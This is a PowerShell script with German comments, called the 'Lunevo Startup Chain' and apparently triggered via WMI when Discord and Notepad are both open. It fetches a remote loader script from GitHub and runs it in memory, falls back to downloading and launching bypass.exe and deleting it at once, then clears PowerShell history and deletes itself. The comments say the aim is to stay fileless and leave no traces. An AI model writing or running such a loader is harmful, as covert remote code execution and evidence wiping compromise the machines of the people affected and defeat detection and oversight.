# Lunevo Startup Chain
# Wird automatisch ausgeführt wenn Discord UND Notepad geöffnet werden
# Komplett fileless - keine Spuren auf Festplatte

Start-Sleep -Seconds 2

# Prüfe ob Discord UND Notepad laufen
$discordRunning = Get-Process -Name "discord" -ErrorAction SilentlyContinue
$notepadRunning = Get-Process -Name "notepad" -ErrorAction SilentlyContinue

if ($discordRunning -and $notepadRunning) {
    # Beide Prozesse laufen - Starte Bypass fileless
    
    # Prüfe ob Bypass bereits läuft (verhindert mehrfaches Starten)
    $bypassRunning = Get-Process -Name "bypass" -ErrorAction SilentlyContinue
    if ($bypassRunning) {
        exit
    }
    
    # Fileless Loader von GitHub laden und direkt ausführen (keine lokale Datei)
    $loaderUrl = "https://raw.githubusercontent.com/lunevo/lunevo/main/loader.ps1"
    try {
        # Lade loader.ps1 direkt in Memory und führe aus (fileless)
        $loader = Invoke-WebRequest -Uri $loaderUrl -UseBasicParsing -ErrorAction Stop
        Invoke-Expression $loader.Content
    } catch {
        # Fallback: Direkter Download der EXE (nur als letzter Ausweg)
        try {
            $exeUrl = "https://raw.githubusercontent.com/lunevo/lunevo/main/bypass.exe"
            $exeBytes = (Invoke-WebRequest -Uri $exeUrl -UseBasicParsing -ErrorAction Stop).Content
            
            # Temporärer Pfad (wird sofort gelöscht)
            $tempPath = "$env:TEMP\Lunevo\bypass_$(Get-Random).exe"
            
            # Erstelle Verzeichnis falls nicht vorhanden
            $exeDir = Split-Path -Parent $tempPath
            if (-not (Test-Path $exeDir)) {
                New-Item -ItemType Directory -Path $exeDir -Force | Out-Null
            }
            
            # Konvertiere zu Byte-Array falls nötig
            if ($exeBytes -is [string]) {
                $exeBytes = [System.Text.Encoding]::Default.GetBytes($exeBytes)
            }
            
            # Schreibe temporär
            [System.IO.File]::WriteAllBytes($tempPath, $exeBytes)
            
            # Starte Prozess
            $proc = Start-Process -FilePath $tempPath -PassThru
            
            # Lösche SOFORT nach Start (fileless cleanup)
            if ($proc) {
                Start-Sleep -Milliseconds 200
                Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue
            }
        } catch {
            # Silent fail
        }
    }
}

# Silent Log Cleaning (minimal, unauffällig)
try {
    # PowerShell History
    $historyPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath
    if ($historyPath -and (Test-Path $historyPath)) {
        Clear-Content -Path $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
    }
    
    # Lösche diese Datei selbst (wird von WMI aufgerufen)
    $scriptPath = $MyInvocation.MyCommand.Path
    if ($scriptPath -and (Test-Path $scriptPath)) {
        Start-Sleep -Milliseconds 500
        Remove-Item -Path $scriptPath -Force -ErrorAction SilentlyContinue | Out-Null
    }
    
    # Lösche alle temporären Lunevo-Dateien (cleanup)
    Get-ChildItem -Path "$env:TEMP\Lunevo" -ErrorAction SilentlyContinue | 
        Where-Object { $_.LastWriteTime -lt (Get-Date).AddMinutes(-10) } | 
        Remove-Item -Force -ErrorAction SilentlyContinue | Out-Null
} catch {
    # Silent
}
